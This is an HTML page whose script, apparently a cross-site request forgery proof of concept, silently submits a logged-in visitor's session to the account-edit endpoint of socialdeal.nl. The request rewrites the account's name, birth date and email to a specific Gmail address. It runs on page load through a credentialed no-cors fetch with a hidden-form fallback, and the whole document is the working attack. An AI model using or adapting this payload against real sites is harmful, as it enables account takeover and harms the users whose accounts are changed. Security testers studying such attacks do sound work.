<!DOCTYPE html>
<html>
<body>
<script>
// Create a form and submit it via fetch with no-cors
const form = document.createElement('form');
form.method = 'POST';
form.action = 'https://www.socialdeal.nl/modal/account/edit/';
form.target = '_blank';

const fields = {
  salutation: 'male',
  firstName: 'Test',
  lastName: 'Tester2',
  'birthDate-day': '4',
  'birthDate-month': '4',
  'birthDate-year': '1995',
  email: 'yeaminhossein300@gmail.com'
};

for (const [name, value] of Object.entries(fields)) {
  const input = document.createElement('input');
  input.type = 'hidden';
  input.name = name;
  input.value = value;
  form.appendChild(input);
}

document.body.appendChild(form);

// Try submitting via fetch with no-cors first (doesn't navigate away)
fetch('https://www.socialdeal.nl/modal/account/edit/', {
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: new URLSearchParams(fields).toString()
}).then(() => {
  // no-cors means we get an opaque response, can't read it
  // But the request was sent — check if email changed
  console.log('Request sent in no-cors mode');
  document.body.innerHTML = '<h2>Request sent via no-cors — check if email changed on socialdeal.nl</h2>';
  
  // Also submit the form normally as fallback
  setTimeout(() => form.submit(), 2000);
});
</script>
</body>
</html>
